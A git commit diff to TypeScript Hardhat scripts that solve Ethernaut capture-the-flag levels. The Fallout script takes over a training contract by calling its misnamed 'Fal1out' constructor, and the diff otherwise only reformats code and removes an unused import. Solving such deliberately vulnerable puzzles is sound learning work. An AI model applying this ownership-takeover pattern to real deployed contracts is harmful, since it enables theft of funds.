aa773f0f0c039d94f08ad8fdc366e93f81ef1afb
julienbrs <julien.bourseau@gmail.com>
2023-03-23 19:05:22 +0100

    Level2 done

--- ethernaut-master/solve/scripts/02-solutionFallout.ts
+++ ethernaut-master/solve/scripts/02-solutionFallout.ts
@@ -4,27 +4,23 @@
 // When running the script with `npx hardhat run <script>` you'll find the Hardhat
 // Runtime Environment's members available in the global scope.
 import { ethers } from "hardhat";
-import { platform } from "os";
 
 const CONTRACT_ADDRESS = "0xf41B47c54dEFF12f8fE830A411a09D865eBb120E";
 const PLAYER_ADDRESS = "0xBcd4042DE499D14e55001CcbB24a551F3b954096";
 
 async function main() {
-    console.log(
-        "\nScript to solve Fallout puzzle \n========================================== \n"
-    );
+    console.log("\nScript to solve Fallout puzzle \n========================================== \n");
 
     const attacker = await ethers.getSigner(PLAYER_ADDRESS);
     const contract = await ethers.getContractAt("Fallout", CONTRACT_ADDRESS, attacker);
 
-    let tx = await contract.Fal1out({value: 10});
+    await contract.Fal1out({ value: 10 });
     const owner = await contract.owner();
 
-    if (owner === attacker.address){
-        console.log("Congratulations! Now submit the solution")
-    }
-    else{
-        console.log("Something went wrong.")
+    if (owner === attacker.address) {
+        console.log("Congratulations! Now submit the solution");
+    } else {
+        console.log("Something went wrong.");
     }
 }
 
--- ethernaut-master/solve/scripts/template.ts
+++ ethernaut-master/solve/scripts/template.ts
@@ -4,7 +4,6 @@
 // When running the script with `npx hardhat run <script>` you'll find the Hardhat
 // Runtime Environment's members available in the global scope.
 import { ethers } from "hardhat";
-import { platform } from "os";
 
 const CONTRACT_ADDRESS = "";
 const PLAYER_ADDRESS = "0xBcd4042DE499D14e55001CcbB24a551F3b954096";
@@ -13,8 +12,6 @@ async function main() {
     console.log(
         "Script to solve Hello Introduction puzzle \n ========================================== \n"
     );
-
-
 }
 
 // We recommend this pattern to be able to use async/await everywhere
